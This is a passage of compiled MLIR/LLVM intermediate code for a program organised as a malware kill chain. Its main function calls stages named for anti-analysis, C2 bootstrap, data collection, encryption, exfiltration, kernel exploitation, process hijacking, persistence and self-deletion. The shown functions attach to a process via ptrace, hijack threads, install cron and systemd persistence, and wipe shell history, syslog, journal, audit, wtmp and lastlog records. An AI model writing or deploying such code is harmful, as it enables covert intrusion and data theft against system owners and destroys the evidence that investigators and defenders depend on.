    %122 = llvm.getelementptr %25[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%122) : (!llvm.ptr) -> ()
    llvm.br ^bb31
  ^bb31:  // 2 preds: ^bb29, ^bb30
    llvm.br ^bb32
  ^bb32:  // 2 preds: ^bb28, ^bb31
    llvm.br ^bb33
  ^bb33:  // pred: ^bb32
    %123 = llvm.add %100, %26 : i64
    llvm.store %123, %98 {alignment = 8 : i64} : i64, !llvm.ptr
    llvm.br ^bb27
  ^bb34:  // pred: ^bb27
    %124 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<70 x i8>
    llvm.call @println(%124) : (!llvm.ptr) -> ()
    %125 = llvm.getelementptr %19[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%125) : (!llvm.ptr) -> ()
    llvm.return %20 : i1
  }
  llvm.func @phase_process_hijacking() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.79" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.constant(1234 : i32) : i32
    %4 = llvm.mlir.addressof @".str.85" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %6 = llvm.mlir.constant(false) : i1
    %7 = llvm.mlir.addressof @".str.80" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.76" : !llvm.ptr
    %9 = llvm.mlir.constant(4096 : i32) : i32
    %10 = llvm.mlir.addressof @".str.81" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.82" : !llvm.ptr
    %12 = llvm.mlir.zero : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.83" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.84" : !llvm.ptr
    %15 = llvm.mlir.constant(true) : i1
    %16 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %17 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %18 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %19 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<48 x i8>
    llvm.call @println(%19) : (!llvm.ptr) -> ()
    llvm.store %3, %16 {alignment = 4 : i64} : i32, !llvm.ptr
    %20 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %21 = llvm.call @jocky_process_ptrace_attach(%20) : (i32) -> i32
    %22 = llvm.icmp "sgt" %21, %2 : i32
    llvm.cond_br %22, ^bb1, ^bb8
  ^bb1:  // pred: ^bb0
    %23 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    %24 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %25 = llvm.sext %24 : i32 to i64
    %26 = llvm.call @string(%25) : (i64) -> !llvm.ptr
    %27 = llvm.call @jocky_str_concat(%23, %26) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %28 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x i8>
    %29 = llvm.call @jocky_str_concat(%27, %28) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%29) : (!llvm.ptr) -> ()
    %30 = llvm.sext %9 : i32 to i64
    %31 = llvm.call @jocky_alloc(%30) : (i64) -> !llvm.ptr
    llvm.store %31, %17 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %32 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %33 = llvm.load %17 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %34 = llvm.sext %9 : i32 to i64
    %35 = llvm.call @jocky_process_get_maps(%32, %33, %34) : (i32, !llvm.ptr, i64) -> i32
    %36 = llvm.icmp "sgt" %35, %2 : i32
    llvm.cond_br %36, ^bb2, ^bb3
  ^bb2:  // pred: ^bb1
    %37 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.call @println(%37) : (!llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb3:  // 2 preds: ^bb1, ^bb2
    %38 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %39 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %40 = llvm.call @jocky_thread_hijack(%38, %39, %2) : (i32, !llvm.ptr, i32) -> i1
    llvm.cond_br %40, ^bb4, ^bb5
  ^bb4:  // pred: ^bb3
    %41 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%41) : (!llvm.ptr) -> ()
    llvm.br ^bb5
  ^bb5:  // 2 preds: ^bb3, ^bb4
    %42 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %43 = llvm.call @jocky_thread_get_info(%42) : (i32) -> !llvm.ptr
    llvm.store %43, %18 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %44 = llvm.load %18 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %45 = llvm.icmp "ne" %44, %12 : !llvm.ptr
    llvm.cond_br %45, ^bb6, ^bb7
  ^bb6:  // pred: ^bb5
    %46 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%46) : (!llvm.ptr) -> ()
    llvm.br ^bb7
  ^bb7:  // 2 preds: ^bb5, ^bb6
    %47 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %48 = llvm.call @jocky_process_ptrace_detach(%47) : (i32) -> i32
    %49 = llvm.load %17 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.call @jocky_free(%49) : (!llvm.ptr) -> ()
    %50 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%50) : (!llvm.ptr) -> ()
    %51 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%51) : (!llvm.ptr) -> ()
    llvm.return %15 : i1
  ^bb8:  // pred: ^bb0
    %52 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<65 x i8>
    llvm.call @println(%52) : (!llvm.ptr) -> ()
    %53 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%53) : (!llvm.ptr) -> ()
    llvm.return %6 : i1
  }
  llvm.func @phase_module_operations() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.86" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.87" : !llvm.ptr
    %4 = llvm.mlir.zero : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.95" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %7 = llvm.mlir.constant(false) : i1
    %8 = llvm.mlir.addressof @".str.88" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.89" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.90" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.91" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.92" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.93" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.94" : !llvm.ptr
    %15 = llvm.mlir.constant(true) : i1
    %16 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %17 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %18 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %19 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %20 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<39 x i8>
    llvm.call @println(%20) : (!llvm.ptr) -> ()
    %21 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %22 = llvm.call @jocky_module_load(%21) : (!llvm.ptr) -> !llvm.ptr
    llvm.store %22, %16 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %23 = llvm.load %16 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %24 = llvm.icmp "ne" %23, %4 : !llvm.ptr
    llvm.cond_br %24, ^bb1, ^bb8
  ^bb1:  // pred: ^bb0
    %25 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.load %16 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %27 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %28 = llvm.call @jocky_module_has_symbol(%26, %27) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.cond_br %28, ^bb2, ^bb3
  ^bb2:  // pred: ^bb1
    %29 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%29) : (!llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb3:  // 2 preds: ^bb1, ^bb2
    %30 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %31 = llvm.call @jocky_module_base(%30) : (!llvm.ptr) -> i64
    llvm.store %31, %17 {alignment = 8 : i64} : i64, !llvm.ptr
    %32 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%32) : (!llvm.ptr) -> ()
    %33 = llvm.load %16 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %34 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %35 = llvm.call @jocky_module_resolve_symbol(%33, %34) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %35, %18 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %36 = llvm.load %18 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %37 = llvm.icmp "ne" %36, %4 : !llvm.ptr
    llvm.cond_br %37, ^bb4, ^bb5
  ^bb4:  // pred: ^bb3
    %38 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @println(%38) : (!llvm.ptr) -> ()
    llvm.br ^bb5
  ^bb5:  // 2 preds: ^bb3, ^bb4
    %39 = llvm.load %16 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %40 = llvm.call @jocky_module_info(%39) : (!llvm.ptr) -> !llvm.ptr
    llvm.store %40, %19 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %41 = llvm.load %19 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %42 = llvm.icmp "ne" %41, %4 : !llvm.ptr
    llvm.cond_br %42, ^bb6, ^bb7
  ^bb6:  // pred: ^bb5
    %43 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%43) : (!llvm.ptr) -> ()
    llvm.br ^bb7
  ^bb7:  // 2 preds: ^bb5, ^bb6
    %44 = llvm.load %16 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %45 = llvm.call @jocky_module_unload(%44) : (!llvm.ptr) -> i1
    %46 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%46) : (!llvm.ptr) -> ()
    %47 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%47) : (!llvm.ptr) -> ()
    llvm.return %15 : i1
  ^bb8:  // pred: ^bb0
    %48 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<64 x i8>
    llvm.call @println(%48) : (!llvm.ptr) -> ()
    %49 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    llvm.return %7 : i1
  }
  llvm.func @phase_persistence_and_cleanup() -> i1 {
    %0 = llvm.mlir.addressof @".str.96" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.97" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.98" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.99" : !llvm.ptr
    %5 = llvm.mlir.constant(true) : i1
    %6 = llvm.mlir.addressof @persistence_set : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.100" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.101" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.102" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.103" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.104" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.105" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.106" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.107" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.108" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.109" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.110" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.111" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.112" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.29" : !llvm.ptr
    %21 = llvm.mlir.addressof @".str.113" : !llvm.ptr
    %22 = llvm.mlir.addressof @".str.114" : !llvm.ptr
    %23 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %24 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<59 x i8>
    llvm.call @println(%24) : (!llvm.ptr) -> ()
    %25 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %26 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %27 = llvm.call @jocky_cron_install(%25, %26) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.cond_br %27, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %28 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%28) : (!llvm.ptr) -> ()
    llvm.store %5, %6 {alignment = 1 : i64} : i1, !llvm.ptr
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %29 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    %30 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %31 = llvm.call @jocky_systemd_install(%29, %30) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.cond_br %31, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %32 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.call @println(%32) : (!llvm.ptr) -> ()
    llvm.store %5, %6 {alignment = 1 : i64} : i1, !llvm.ptr
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %33 = llvm.call @linux_forensics_wipe_bash_history() : () -> i32
    %34 = llvm.icmp "sgt" %33, %1 : i32
    llvm.cond_br %34, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %35 = llvm.getelementptr %9[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%35) : (!llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb4, ^bb5
    %36 = llvm.call @jocky_linux_cleanup_syslog() : () -> i32
    %37 = llvm.icmp "sgt" %36, %1 : i32
    llvm.cond_br %37, ^bb7, ^bb8
  ^bb7:  // pred: ^bb6
    %38 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    llvm.call @println(%38) : (!llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    %39 = llvm.call @jocky_linux_cleanup_journal() : () -> i32
    %40 = llvm.icmp "sgt" %39, %1 : i32
    llvm.cond_br %40, ^bb9, ^bb10
  ^bb9:  // pred: ^bb8
    %41 = llvm.getelementptr %11[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    llvm.call @println(%41) : (!llvm.ptr) -> ()
    llvm.br ^bb10
  ^bb10:  // 2 preds: ^bb8, ^bb9
    %42 = llvm.call @jocky_linux_cleanup_audit() : () -> i32
    %43 = llvm.icmp "sgt" %42, %1 : i32
    llvm.cond_br %43, ^bb11, ^bb12
  ^bb11:  // pred: ^bb10
    %44 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    llvm.call @println(%44) : (!llvm.ptr) -> ()
    llvm.br ^bb12
  ^bb12:  // 2 preds: ^bb10, ^bb11
    %45 = llvm.call @jocky_linux_cleanup_wtmp() : () -> i32
    %46 = llvm.icmp "sgt" %45, %1 : i32
    llvm.cond_br %46, ^bb13, ^bb14
  ^bb13:  // pred: ^bb12
    %47 = llvm.getelementptr %13[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%47) : (!llvm.ptr) -> ()
    llvm.br ^bb14
  ^bb14:  // 2 preds: ^bb12, ^bb13
    %48 = llvm.call @jocky_linux_cleanup_lastlog() : () -> i32
    %49 = llvm.icmp "sgt" %48, %1 : i32
    llvm.cond_br %49, ^bb15, ^bb16
  ^bb15:  // pred: ^bb14
    %50 = llvm.getelementptr %14[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    llvm.call @println(%50) : (!llvm.ptr) -> ()
    llvm.br ^bb16
  ^bb16:  // 2 preds: ^bb14, ^bb15
    %51 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<5 x i8>
    %52 = llvm.getelementptr %16[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %53 = llvm.call @jocky_wipe_temp_files(%51, %52) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.cond_br %53, ^bb17, ^bb18
  ^bb17:  // pred: ^bb16
    %54 = llvm.getelementptr %17[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%54) : (!llvm.ptr) -> ()
    llvm.br ^bb18
  ^bb18:  // 2 preds: ^bb16, ^bb17
    %55 = llvm.call @forensics_clear_dns_cache() : () -> i32
    %56 = llvm.icmp "sgt" %55, %1 : i32
    llvm.cond_br %56, ^bb19, ^bb20
  ^bb19:  // pred: ^bb18
    %57 = llvm.getelementptr %18[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%57) : (!llvm.ptr) -> ()
    llvm.br ^bb20
  ^bb20:  // 2 preds: ^bb18, ^bb19
    %58 = llvm.call @forensics_flush_arp_cache() : () -> i32
    %59 = llvm.icmp "sgt" %58, %1 : i32
    llvm.cond_br %59, ^bb21, ^bb22
  ^bb21:  // pred: ^bb20
    %60 = llvm.getelementptr %19[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%60) : (!llvm.ptr) -> ()
    llvm.br ^bb22
  ^bb22:  // 2 preds: ^bb20, ^bb21
    %61 = llvm.getelementptr %20[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    llvm.call @jocky_wipe_artifacts(%61) : (!llvm.ptr) -> ()
    %62 = llvm.getelementptr %21[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%62) : (!llvm.ptr) -> ()
    %63 = llvm.getelementptr %22[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<66 x i8>
    llvm.call @println(%63) : (!llvm.ptr) -> ()
    %64 = llvm.getelementptr %23[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%64) : (!llvm.ptr) -> ()
    llvm.return %5 : i1
  }
  llvm.func @phase_self_delete() -> i1 {
    %0 = llvm.mlir.addressof @".str.115" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.116" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.117" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.100" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.118" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.119" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.120" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %9 = llvm.mlir.constant(true) : i1
    %10 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%10) : (!llvm.ptr) -> ()
    %11 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    %12 = llvm.call @jocky_cron_remove(%11) : (!llvm.ptr) -> i1
    %13 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    llvm.call @println(%13) : (!llvm.ptr) -> ()
    %14 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    %15 = llvm.call @jocky_systemd_remove(%14) : (!llvm.ptr) -> i1
    %16 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @println(%16) : (!llvm.ptr) -> ()
    %17 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%17) : (!llvm.ptr) -> ()
    llvm.call @jocky_self_delete() : () -> ()
    %18 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%18) : (!llvm.ptr) -> ()
    %19 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%19) : (!llvm.ptr) -> ()
    llvm.return %9 : i1
  }
  llvm.func @main() -> i32 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.121" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.122" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.123" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.124" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.125" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.126" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.127" : !llvm.ptr
    %10 = llvm.mlir.constant(true) : i1
    %11 = llvm.mlir.addressof @".str.128" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.129" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.15" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.130" : !llvm.ptr
    %15 = llvm.mlir.addressof @root_achieved : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.131" : !llvm.ptr
    %17 = llvm.mlir.addressof @kernel_access : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.132" : !llvm.ptr
    %19 = llvm.mlir.addressof @persistence_set : !llvm.ptr
    %20 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %21 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%21) : (!llvm.ptr) -> ()
    %22 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<187 x i8>
    llvm.call @println(%22) : (!llvm.ptr) -> ()
    %23 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<66 x i8>
    llvm.call @println(%23) : (!llvm.ptr) -> ()
    %24 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<65 x i8>
    llvm.call @println(%24) : (!llvm.ptr) -> ()
    %25 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<187 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%26) : (!llvm.ptr) -> ()
    %27 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %28 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    %29 = llvm.call @jocky_str_concat(%27, %28) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%29) : (!llvm.ptr) -> ()
    %30 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%30) : (!llvm.ptr) -> ()
    %31 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%31) : (!llvm.ptr) -> ()
    %32 = llvm.call @phase_anti_analysis() : () -> i1
    %33 = llvm.xor %32, %10 : i1
    llvm.cond_br %33, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    llvm.return %0 : i32
  ^bb2:  // pred: ^bb0
    %34 = llvm.call @phase_c2_bootstrap() : () -> i1
    llvm.store %34, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %35 = llvm.call @phase_download_model() : () -> i1
    llvm.store %35, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %36 = llvm.call @phase_discover_data() : () -> i1
    llvm.store %36, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %37 = llvm.call @phase_collect_data() : () -> i1
    llvm.store %37, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %38 = llvm.call @phase_encrypt_data() : () -> i1
    llvm.store %38, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %39 = llvm.call @phase_exfiltrate() : () -> i1
    llvm.store %39, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %40 = llvm.call @phase_kernel_exploit() : () -> i1
    llvm.store %40, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %41 = llvm.call @phase_process_hijacking() : () -> i1
    llvm.store %41, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %42 = llvm.call @phase_module_operations() : () -> i1
    llvm.store %42, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %43 = llvm.call @phase_persistence_and_cleanup() : () -> i1
    llvm.store %43, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %44 = llvm.call @phase_self_delete() : () -> i1
    llvm.store %44, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %45 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%45) : (!llvm.ptr) -> ()
    %46 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    llvm.call @println(%46) : (!llvm.ptr) -> ()
    %47 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %48 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %49 = llvm.call @strlen(%48) : (!llvm.ptr) -> i64
    %50 = llvm.call @string(%49) : (i64) -> !llvm.ptr
    %51 = llvm.call @jocky_str_concat(%47, %50) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %52 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
